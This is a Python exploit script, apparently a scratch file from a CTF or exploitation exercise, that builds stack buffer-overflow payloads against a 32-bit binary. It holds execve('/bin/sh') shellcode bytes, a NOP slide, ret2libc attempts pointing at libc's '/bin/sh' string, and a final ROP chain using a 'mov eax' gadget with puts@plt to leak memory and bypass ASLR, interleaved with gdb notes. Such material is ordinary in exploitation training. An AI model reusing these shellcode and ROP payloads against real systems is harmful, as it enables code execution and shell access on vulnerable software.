#!/usr/bin/python3
import struct
import sys

# 0x565555d0 <main+99>      lea    esp,[ebp-0x8]    ; esp = ebp-8, set esp to ebp-8                                   
# 0x565555d3 <main+102>     pop    ecx              ; ecx = value at top of stack ($esp)
# 0x565555d4 <main+103>     pop    ebx              ; pop another stack value
# 0x565555d6 <main+105>     lea    esp,[ecx-0x4]    ; esp  = ecx-4, set esp to ecx-4
# 0x565555d9 <main+108>     ret                     ; pop value at top of stack ($esp) and return

# padding0 = "AAAAB".encode() + b'\xef\xbe\xad\xde'

# padding = "AAAAB".encode()
# offset = 40 # add an offset that will hopefully hit the nopslide
# eip  = struct.pack("I", 0xffffdd90 + offset) * 10
nopslide = b'\x90'*200
# code = b'\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80'
# code = b'\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x1b\xcd\x80\x31\xc0\x40\xcd\x80'

# b0 ff = mov al, 0xFF
# 2c f4 = sub al, 0xF4
addSub = b'\xb0\xff\x2c\xf4'
code = b'\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2' + addSub + b'\xcd\x80\x31\xc0\x40\xcd\x80'

# payload = padding + eip + nopslide + code
# payload = padding0

# payload = ("1 "+"A"*2000).encode()
deadbeef = b'\xef\xbe\xad\xde'
# 0x08049040 printf@plt
# 0xffffdd70 stack return address 
# 0xf7e975b0 execve
# 0x080494e3 : mov eax, dword ptr [esp] ; ret
# 0x08049050  puts@plt
offset = 0
desiredAddress = struct.pack("I", 0xf7e935b0 + offset)   # ebx + 4

# $ grep -R -a -b -o /bin/sh /lib/i386-linux-gnu/libc.so.6
# 1564879:/bin/sh

# binsh: x/s 0xf7f560cf      0xf7f560cf:	"/bin/sh"
#            0xf7f280cf
#            0xf7f520cf
binsh = struct.pack("I", 0xf7f520cf)
# binsh = struct.pack("I", 1564879 + 0xf7d06000)
# payload = b'1 ' + b'A'*1008 + deadbeef + desiredAddress + b'AAAA' + binsh + b'\x00'*8
# payload = b'1 ' + b'A'*1012 + deadbeef + desiredAddress + b'helloworld' # + nopslide + code
#payload = b'1 ' + desiredAddress*255 + nopslide + code
# payload = desiredAddress*255 + nopslide + code
# for letter in "abcdefghijklmnopqrstuvwxyz":
#     payload += letter.upper().encode() * 100
#print(payload)
# sys.stdout.buffer.write(payload)



# >>> info breakpoints
# Num     Type           Disp Enb Address    What
# 1       breakpoint     keep y   0x08049276 

# https://security.stackexchange.com/questions/149035/is-aslr-useless-in-preventing-attacks-such-as-return-to-libc-in-linux
# Is ASLR useless in preventing attacks such as return-to-libc in linux?
# When PIE is not used, the program must rely on a fixed PLT, created during linking, to resolve the addresses of functions in shared libraries.

# 0x08049050  puts@plt
# https://sidsbits.com/Defeating-ASLR-with-a-Leak/#Defeating-ASLR-with-a-Leak
# buf += p64(e.plt['puts']) # Return address - call the puts function
# buf += p64(e.got['puts']) # Argument to puts - GOT['puts']

# 0x08049050  puts@plt
eaxGadget = struct.pack("I", 0x080494e3)
putsPlt = struct.pack("I", 0x08049050)

# puts("Current balance: $500\n");
# Current balance: $500
# => 0x804945c:	add    esp,0x10 <== this address is right after "Current balance"

# Breakpoint 5, 0x08049040 in printf@plt ()
# >>> x/10i 0x08049208
#    0x804921c:	call   0x8049080 <__isoc99_scanf@plt> <== scanf address

# 0x08049060  exit@plt <======== EXIT address
returnAddress = struct.pack("I", 0x08049060)

payload = b'1 ' + b'A'*1012 + deadbeef + eaxGadget + putsPlt + returnAddress
#                                        ^ at first ret go to the eaxGadget
#                                                    ^ at eaxGadget, move in top of stack, which is the putsAddress. then ret to putsAddress :D
#                                                      puts will print whatever $eax is pointing to, which is puts itself? but its not. It's the stack?                                                       
#                                                              ^ from puts, ret to whatever :D

# $eax needs to point to the string that will go into puts
# rop gadget: 0x080494e3 : mov eax, dword ptr [esp] ; ret
# Program received signal SIGSEGV, Segmentation fault.
# => 0xf7e711d1:	mov    ecx, DWORD PTR [eax]




sys.stdout.buffer.write(payload)